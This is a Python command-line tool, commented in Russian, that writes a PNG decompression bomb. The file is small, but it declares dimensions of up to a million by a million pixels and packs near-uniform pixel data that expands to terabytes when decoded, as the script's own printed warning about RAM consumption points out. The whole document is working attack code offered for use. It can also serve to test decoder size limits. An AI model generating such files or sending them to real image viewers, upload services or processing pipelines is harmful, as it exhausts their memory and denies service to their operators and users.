import zlib
import struct
import sys
import argparse
import time


def png_chunk(ctype, data):
    """PNG chunk: 4-byte length + type + data + CRC32."""
    body = ctype + data
    return struct.pack('>I', len(data)) + body + struct.pack('>I', zlib.crc32(body) & 0xFFFFFFFF)


def create_png_bomb(width, height, filename, mode='rgba'):
    """
    Generate a PNG bomb file (Optimized version).
    """
    color_type, bpp = {'gray': (0, 1), 'rgb': (2, 3), 'rgba': (6, 4)}[mode]

    # ── IHDR ──
    ihdr = struct.pack('>IIBBBBB', width, height, 8, color_type, 0, 0, 0)

    # Уровень сжатия 1 вместо 9. Скорость возрастет кратно,
    # а размер файла почти не изменится из-за идеальной повторяемости данных.
    comp = zlib.compressobj(1, zlib.DEFLATED, 15)
    line_len = 1 + width * bpp

    first_line = b'\x00' + bytes([0x80] * (width * bpp))
    up_line = b'\x02' + bytes(width * bpp)

    # Оптимальный размер батча (~25 MB) для эффективной работы CPU кэша
    batch_count = max(1, min(height - 1, (50 * 1024 * 1024) // max(line_len, 1)))

    # Сразу открываем файл для потоковой записи (streaming)
    with open(filename, 'wb') as f:
        f.write(b'\x89PNG\r\n\x1a\n')  # Signature
        f.write(png_chunk(b'IHDR', ihdr))

        # Сжимаем и сразу пишем первую строку в IDAT
        chunk = comp.compress(first_line)
        if chunk:
            f.write(png_chunk(b'IDAT', chunk))

        remaining = height - 1
        print(remaining)
        if remaining > 0:
            up_batch = up_line * batch_count

            while remaining >= batch_count:
                chunk = comp.compress(up_batch)
                # Пишем IDAT-чанки по мере поступления данных (спецификация PNG это разрешает)
                if chunk:
                    f.write(png_chunk(b'IDAT', chunk))
                remaining -= batch_count
                print(remaining)
            if remaining > 0:
                chunk = comp.compress(up_line * remaining)
                if chunk:
                    f.write(png_chunk(b'IDAT', chunk))

        # Сбрасываем остатки буфера zlib
        chunk = comp.flush()
        if chunk:
            f.write(png_chunk(b'IDAT', chunk))

        f.write(png_chunk(b'IEND', b''))

        # Получаем точный размер файла напрямую из файловой системы
        file_size = f.tell()

    return file_size


# Функции human() и main() остаются без изменений
def human(n):
    for u in ['B', 'KB', 'MB', 'GB', 'TB', 'PB']:
        if n < 1024:
            return f"{n:.1f} {u}"
        n /= 1024
    return f"{n:.1f} EB"


def main():
    ap = argparse.ArgumentParser(description='PNG Decompression Bomb Generator')
    ap.add_argument('-W', '--width', type=int, default=1000000)
    ap.add_argument('-H', '--height', type=int, default=1000000)
    ap.add_argument('-m', '--mode', choices=['gray', 'rgb', 'rgba'],
                    default='rgba', help='Color mode (default: rgba)')
    ap.add_argument('-o', '--output', default='bomb.png')
    args = ap.parse_args()

    W, H = args.width, args.height
    if W < 1 or H < 1:
        print("Error: dimensions must be >= 1");
        sys.exit(1)
    if W > 2 ** 31 - 1 or H > 2 ** 31 - 1:
        print("Error: PNG max dimension is 2^31-1");
        sys.exit(1)

    bpp = {'gray': 1, 'rgb': 3, 'rgba': 4}[args.mode]
    decoded = W * H * bpp
    display = W * H * 4

    print(f"PNG Bomb Generator")
    print(f"{'=' * 40}")
    print(f"Image:     {W:,} x {H:,} px ({args.mode.upper()})")
    print(f"Decoded:   {human(decoded)}")
    print(f"Display:   {human(display)} (RGBA)")
    print()
    start = time.perf_counter()

    file_size = create_png_bomb(W, H, args.output, args.mode)
    end = time.perf_counter()
    print(f"Elapsed time: {end - start:0.4f} seconds")
    print(f"Created:   '{args.output}' — {human(file_size)}")
    print(f"Ratio:     {display / file_size:,.0f}x")
    print(f"Opening this file may consume {human(display)} of RAM!")


if __name__ == '__main__':
    main()